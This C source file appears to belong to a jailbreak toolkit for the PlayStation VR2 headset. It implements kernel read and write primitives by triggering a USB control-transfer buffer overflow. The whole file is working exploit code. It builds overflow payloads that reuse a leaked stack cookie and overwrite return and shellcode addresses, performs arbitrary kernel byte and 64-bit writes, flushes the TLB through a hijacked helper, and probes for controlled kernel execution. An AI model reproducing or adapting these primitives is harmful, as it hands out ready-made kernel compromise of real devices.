#include "psvr2/rw.h"
#include "firmware_0600_internal.h"
#include "psvr2/kernel_payload.h"

#include <stdlib.h>
#include <string.h>

static bool sync_connection_generation(psvr2_krw *krw) {
    if (!krw || !krw->ex || !krw->ex->usb)
        return false;
    uint64_t generation = krw->ex->usb->connection_generation;
    if (krw->connection_generation != generation) {
        krw->connection_generation = generation;
        krw->spinlock = 0;
        memset(&krw->regs, 0, sizeof(krw->regs));
        psvr2_constants_invalidate_live_state(krw->ex->constants);
    }
    return true;
}

void psvr2_krw_init(psvr2_krw *krw, psvr2_exploit *ex) {
    memset(krw, 0, sizeof(*krw));
    krw->ex = ex;
    if (ex && ex->usb)
        krw->connection_generation = ex->usb->connection_generation;
    krw->last_result = psvr2_result_ok();
}

static bool trigger_overflow_once(
    psvr2_device *usb, const void *payload,
    uint16_t length, unsigned timeout_ms) {
    int rc = psvr2_device_control(
        usb, 0x21, 0x09, 0x01f0, 0,
        (void *)payload, length, timeout_ms);
    return rc == (int)length;
}

bool psvr2_krw_trigger_overflow(psvr2_krw *krw, const void *payload,
                                uint16_t length, unsigned timeout_ms) {
    return psvr2_krw_trigger_overflow_ex(
        krw, payload, length, timeout_ms, NULL);
}

bool psvr2_krw_trigger_overflow_ex(
    psvr2_krw *krw, const void *payload,
    uint16_t length, unsigned timeout_ms, bool *attempted) {
    if (attempted) *attempted = false;
    if (!payload || !length || !sync_connection_generation(krw) ||
        !krw->ex->constants ||
        !krw->regs.valid || !krw->spinlock ||
        !krw->ex->direct_read_ready)
        return false;
    if (!krw->ex->constants->live_profile_certified ||
        krw->ex->constants->certified_connection_generation !=
            krw->ex->usb->connection_generation) {
        psvr2_constants_invalidate_live_state(krw->ex->constants);
        return false;
    }
    if (!krw->ex->usb->handle) {
        psvr2_constants_invalidate_live_state(krw->ex->constants);
        return false;
    }
    if (attempted) *attempted = true;
    return trigger_overflow_once(
        krw->ex->usb, payload, length, timeout_ms);
}

size_t psvr2_build_strb_payload(
    const psvr2_constants *c,
    uint8_t out[PSVR2_WRITE_PAYLOAD_SIZE],
    uint64_t target, uint8_t value, uint64_t x21) {
    if (!c || !out) return 0;
    memset(out, 0, PSVR2_WRITE_PAYLOAD_SIZE);
    out[0] = 0xf0; out[1] = 0x01;
    psvr2_store_le64(out + 64, c->fw.stack_cookie);
    psvr2_store_le64(out + 80, c->fw.clean_return);
    psvr2_store_le64(
        out + 96, target - PSVR2_MTU3_ENDPOINT_STATE_OFFSET);
    psvr2_store_le64(out + 104, x21);
    psvr2_store_le64(out + 112, value);
    psvr2_store_le64(out + 192, c->fw.stack_cookie);
    return PSVR2_WRITE_PAYLOAD_SIZE;
}

size_t psvr2_build_fast_write_payload(
    const psvr2_constants *c,
    uint8_t out[PSVR2_WRITE_PAYLOAD_SIZE],
    uint64_t target, uint64_t value,
    uint64_t x21, uint64_t x22, uint64_t shellcode_addr) {
    if (!c || !out) return 0;
    memset(out, 0, PSVR2_WRITE_PAYLOAD_SIZE);
    out[0] = 0xf0; out[1] = 0x01;
    psvr2_store_le64(out + 64, c->fw.stack_cookie);
    psvr2_store_le64(out + 80, shellcode_addr);
    psvr2_store_le64(out + 88, value);
    psvr2_store_le64(out + 96, target);
    psvr2_store_le64(out + 104, x21);
    psvr2_store_le64(out + 112, x22);
    psvr2_store_le64(out + 192, c->fw.stack_cookie);
    return PSVR2_WRITE_PAYLOAD_SIZE;
}

static bool discover_registers(psvr2_krw *krw, psvr2_registers *r,
                               bool verbose) {
    psvr2_exploit *ex = krw->ex;
    uint64_t live[4];
    if (!psvr2_exploit_direct_context(ex, live))
        return false;
    r->req = live[0];
    r->mep = live[1];
    r->x21 = live[2];
    r->x22 = (uint8_t)live[3];
    r->valid = true;
    if (verbose) {
        printf("    [disc] req=0x%llx mep=0x%llx x21=0x%llx x22=0x%02x\n",
               (unsigned long long)r->req, (unsigned long long)r->mep,
               (unsigned long long)r->x21, r->x22);
    }
    return r->valid;
}

bool psvr2_krw_setup_write(psvr2_krw *krw, bool verbose, bool force) {
    psvr2_result result =
        psvr2_krw_setup_write_result(krw, verbose, force);
    return psvr2_result_is_ok(&result);
}

psvr2_result psvr2_krw_setup_write_result(
    psvr2_krw *krw, bool verbose, bool force) {
    if (!krw || !krw->ex) {
        psvr2_result result = psvr2_result_error(
            PSVR2_STATUS_INVALID_ARGUMENT, 0,
            "kernel read/write context is unavailable");
        if (krw) krw->last_result = result;
        return result;
    }
    if (!sync_connection_generation(krw)) {
        krw->last_result = psvr2_result_error(
            PSVR2_STATUS_INVALID_ARGUMENT, 0,
            "USB connection state is unavailable");
        return krw->last_result;
    }
    if (!force && krw->regs.valid) {
        krw->last_result = psvr2_result_ok();
        return krw->last_result;
    }
    psvr2_registers r = {0};
    bool ok = discover_registers(krw, &r, verbose);
    if (ok) {
        krw->regs = r;
        krw->spinlock = r.x21;
        krw->last_result = psvr2_result_ok();
    } else {
        const psvr2_result *cause =
            psvr2_exploit_last_result(krw->ex);
        krw->last_result =
            cause && !psvr2_result_is_ok(cause)
                ? *cause
                : psvr2_result_error(
                      PSVR2_STATUS_VALIDATION_FAILED, 0,
                      "live write-context validation failed");
    }
    return krw->last_result;
}

bool psvr2_krw_setup_write_ex(psvr2_krw *krw, bool verbose, bool force,
                              bool fatal) {
    (void)fatal;
    psvr2_result result =
        psvr2_krw_setup_write_result(krw, verbose, force);
    return psvr2_result_is_ok(&result);
}

psvr2_result psvr2_krw_read_result(
    psvr2_krw *krw, uint64_t addr, void *out,
    size_t length, bool reinit) {
    if (!krw || !krw->ex) {
        psvr2_result result = psvr2_result_error(
            PSVR2_STATUS_INVALID_ARGUMENT, 0,
            "kernel read/write context is unavailable");
        if (krw) krw->last_result = result;
        return result;
    }
    (void)sync_connection_generation(krw);
    krw->last_result =
        psvr2_exploit_read_result(
            krw->ex, addr, out, length, reinit);
    (void)sync_connection_generation(krw);
    return krw->last_result;
}

bool psvr2_krw_read_ex(psvr2_krw *krw, uint64_t addr, void *out, size_t length,
                       bool reinit, bool fatal) {
    (void)fatal;
    psvr2_result result =
        psvr2_krw_read_result(krw, addr, out, length, reinit);
    return psvr2_result_is_ok(&result);
}

bool psvr2_krw_read(psvr2_krw *krw, uint64_t addr, void *out, size_t length) {
    return psvr2_krw_read_ex(krw, addr, out, length, true, true);
}

uint64_t psvr2_krw_read_ptr(psvr2_krw *krw, uint64_t addr) {
    uint8_t data[8];
    return psvr2_krw_read(krw, addr, data, sizeof(data)) ? psvr2_load_le64(data) : 0;
}

uint32_t psvr2_krw_read_u32(psvr2_krw *krw, uint64_t addr) {
    uint8_t data[4];
    return psvr2_krw_read(krw, addr, data, sizeof(data)) ? psvr2_load_le32(data) : 0;
}

bool psvr2_krw_read_string(psvr2_krw *krw, uint64_t addr, char *out, size_t max_len) {
    if (!krw || !out || !max_len) return false;

    /*
     * Arbitrary reads are reconstructed through USB descriptors, so fetching
     * the caller's entire capacity for a short string is disproportionately
     * expensive. Read in small bounded chunks and stop at the terminator.
     */
    const size_t capacity = max_len - 1U;
    size_t offset = 0;
    while (offset < capacity) {
        size_t length = psvr2_min_size(16, capacity - offset);
        if (!psvr2_krw_read(krw, addr + offset, out + offset, length))
            return false;
        if (memchr(out + offset, '\0', length))
            return true;
        offset += length;
    }
    out[capacity] = '\0';
    return true;
}

bool psvr2_krw_write_byte_blind(psvr2_krw *krw, uint64_t addr, uint8_t value) {
    if (!sync_connection_generation(krw) ||
        !krw->spinlock || !krw->regs.valid || !krw->regs.mep)
        return false;
    uint8_t payload[PSVR2_WRITE_PAYLOAD_SIZE];
    if (psvr2_build_strb_payload(
            krw->ex->constants, payload, addr, value,
            krw->spinlock) != sizeof(payload))
        return false;
    /* The completion path stores W22 into mep->busy. Restore zero after an
     * arbitrary byte write, as corrected by RealSupremium in vr2jb. */
    const uint64_t busy =
        krw->regs.mep + PSVR2_MTU3_ENDPOINT_STATE_OFFSET;
    uint8_t restore[PSVR2_WRITE_PAYLOAD_SIZE];
    if (addr != busy &&
        psvr2_build_strb_payload(
            krw->ex->constants, restore, busy, 0,
            krw->spinlock) != sizeof(restore))
        return false;
    for (unsigned i = 0; i < 3; ++i) {
        bool attempted = false;
        bool wrote = psvr2_krw_trigger_overflow_ex(
            krw, payload, sizeof(payload), 2500, &attempted);
        if (!attempted) return false;
        if (addr == busy) {
            if (wrote) return true;
            continue;
        }
        /* A failed USB response does not prove that the payload did not run. */
        bool restored = false;
        for (unsigned retry = 0; retry < 3; ++retry)
            if (psvr2_krw_trigger_overflow(
                    krw, restore, sizeof(restore), 2500)) {
                restored = true;
                break;
            }
        if (!restored) {
            krw->regs.valid = false;
            krw->last_result = psvr2_result_error(
                PSVR2_STATUS_RECOVERY_REQUIRED, 0,
                "endpoint busy-state restoration was not confirmed");
            return false;
        }
        if (wrote) return true;
    }
    return false;
}

bool psvr2_krw_write_byte(psvr2_krw *krw, uint64_t addr, uint8_t value) {
    for (unsigned i = 0; i < 5; ++i) {
        if (!psvr2_krw_write_byte_blind(krw, addr, value)) continue;
        uint8_t check;
        if (psvr2_krw_read(krw, addr, &check, 1) && check == value) return true;
    }
    return false;
}

bool psvr2_krw_write_u64_slow(psvr2_krw *krw, uint64_t addr, uint64_t value) {
    for (unsigned i = 0; i < 8; ++i)
        if (!psvr2_krw_write_byte(krw, addr + i, (uint8_t)(value >> (i * 8U)))) return false;
    return true;
}

bool psvr2_krw_write_u64_blind(psvr2_krw *krw, uint64_t addr, uint64_t value) {
    for (unsigned i = 0; i < 8; ++i)
        if (!psvr2_krw_write_byte_blind(krw, addr + i,
                                        (uint8_t)(value >> (i * 8U)))) return false;
    return true;
}

bool psvr2_krw_write_u64_fast(psvr2_krw *krw, uint64_t addr, uint64_t value) {
    if (!sync_connection_generation(krw) ||
        !krw->ex->constants ||
        !krw->spinlock ||
        !krw->regs.valid ||
        !psvr2_constants_shellcode_execution_safe(krw->ex->constants))
        return false;
    uint8_t payload[PSVR2_WRITE_PAYLOAD_SIZE];
    psvr2_build_fast_write_payload(krw->ex->constants, payload, addr, value,
                                   krw->spinlock, 0,
                                   krw->ex->constants->str_helper);
    return psvr2_krw_trigger_overflow(
        krw, payload, sizeof(payload), 2500);
}

bool psvr2_krw_write_u32_fast(psvr2_krw *krw, uint64_t addr, uint32_t value) {
    uint64_t base = addr & ~UINT64_C(7);
    unsigned off = (unsigned)(addr & 7);
    uint8_t data[8];
    if (off > 4 || !psvr2_krw_read(krw, base, data, sizeof(data))) return false;
    psvr2_store_le32(data + off, value);
    return psvr2_krw_write_u64_fast(krw, base, psvr2_load_le64(data));
}

bool psvr2_krw_write_buffer(psvr2_krw *krw, uint64_t addr,
                            const void *data, size_t length, bool fast) {
    const uint8_t *src = data;
    size_t off = 0;
    if (fast) {
        while (off + 8 <= length) {
            if (!psvr2_krw_write_u64_fast(krw, addr + off,
                                          psvr2_load_le64(src + off))) return false;
            off += 8;
        }
    }
    while (off < length) {
        if (!psvr2_krw_write_byte(krw, addr + off, src[off])) return false;
        ++off;
    }
    return true;
}

bool psvr2_krw_flush_tlb(psvr2_krw *krw) {
    if (!sync_connection_generation(krw) ||
        !krw->ex->constants ||
        !krw->regs.valid || !krw->spinlock ||
        !psvr2_constants_shellcode_execution_safe(krw->ex->constants))
        return false;
    uint8_t expected[PSVR2_TLBI_CLEANUP_SIZE];
    uint8_t observed[PSVR2_TLBI_CLEANUP_SIZE];
    if (!psvr2_build_tlbi_cleanup(
            krw->ex->constants, expected, krw->regs.x22) ||
        !psvr2_krw_read_ex(
            krw, krw->ex->constants->fw.tlbi_cleanup_helper, observed,
            sizeof(observed), true, false) ||
        memcmp(observed, expected, sizeof(observed)) != 0)
        return false;

    uint8_t payload[136];
    if (psvr2_build_tlbi_payload(
            krw->ex->constants, payload,
            krw->ex->constants->fw.tlbi_cleanup_helper, 0,
            krw->regs.mep, krw->spinlock) != sizeof(payload))
        return false;
    bool sent = psvr2_krw_trigger_overflow(
        krw, payload, sizeof(payload), 2500);
    return sent;
}

psvr2_result psvr2_krw_kernel_execution_probe_result(
    psvr2_krw *krw, bool verbose) {
    if (!krw || !krw->ex || !krw->ex->constants || !krw->regs.valid) {
        psvr2_result result = psvr2_result_error(
            PSVR2_STATUS_INVALID_ARGUMENT, 0,
            "validated write context is unavailable");
        if (krw) krw->last_result = result;
        return result;
    }

    const psvr2_constants *constants = krw->ex->constants;
    const uint64_t target = constants->fw.kernel_probe_byte;
    if (!psvr2_constants_kernel_probe_safe(constants)) {
        krw->last_result = psvr2_result_error(
            PSVR2_STATUS_UNSUPPORTED, 0,
            "no exact-binary-backed kernel probe target is available "
            "for this firmware");
        return krw->last_result;
    }
    if (!sync_connection_generation(krw) || !krw->regs.valid) {
        krw->last_result = psvr2_result_error(
            PSVR2_STATUS_STATE_CHANGED, 0,
            "USB reconnect invalidated the write context");
        return krw->last_result;
    }

    uint8_t before_a = 0, before_b = 0, observed = 0;
    bool attempted = false;
    bool controlled = false;
    bool restored = false;
    if (!psvr2_krw_read_ex(krw, target, &before_a, 1, true, false))
        return krw->last_result;
    psvr2_sleep_ms(50);
    if (!psvr2_krw_read_ex(krw, target, &before_b, 1, true, false) ||
        before_a != before_b) {
        if (!psvr2_result_is_ok(&krw->last_result))
            return krw->last_result;
        krw->last_result = psvr2_result_error(
            PSVR2_STATUS_STATE_CHANGED, 0,
            "probe byte changed between stability reads");
        return krw->last_result;
    }

    const uint8_t wanted = (uint8_t)(before_a ^ UINT8_C(1));
    if (verbose) {
        printf("[*] Probe target 0x%llx: 0x%02x -> 0x%02x -> 0x%02x\n",
               (unsigned long long)target, before_a, wanted, before_a);
    }

    attempted = true;
    if (psvr2_krw_write_byte_blind(krw, target, wanted) &&
        psvr2_krw_read_ex(krw, target, &observed, 1, true, false) &&
        observed == wanted) {
        controlled = true;
    }

    /*
     * Always restore after an attempted write.  Even a USB error can occur
     * after the device executed the payload.
     */
    if (attempted) {
        uint8_t current = 0;
        bool already_restored =
            psvr2_krw_read_ex(krw, target, &current, 1, true, false) &&
            current == before_a;
        bool restore_sent =
            already_restored ||
            psvr2_krw_write_byte_blind(krw, target, before_a);
        uint8_t final = 0;
        restored = restore_sent &&
                   psvr2_krw_read_ex(krw, target, &final, 1, true, false) &&
                   final == before_a;
    }

    if (verbose && controlled)
        puts("[+] Controlled kernel STRB executed and verified.");
    if (verbose && restored)
        puts("[+] Probe byte restored and verified.");
    if (!restored)
        krw->last_result = psvr2_result_error(
            PSVR2_STATUS_RECOVERY_REQUIRED, 0,
            "probe byte restoration could not be verified");
    else if (!controlled)
        krw->last_result = psvr2_result_error(
            PSVR2_STATUS_VALIDATION_FAILED, 0,
            "controlled kernel STRB was not verified");
    else
        krw->last_result = psvr2_result_ok();
    return krw->last_result;
}

bool psvr2_krw_kernel_execution_probe(psvr2_krw *krw, bool verbose) {
    psvr2_result result =
        psvr2_krw_kernel_execution_probe_result(krw, verbose);
    return psvr2_result_is_ok(&result);
}

const psvr2_result *psvr2_krw_last_result(const psvr2_krw *krw) {
    return krw ? &krw->last_result : NULL;
}
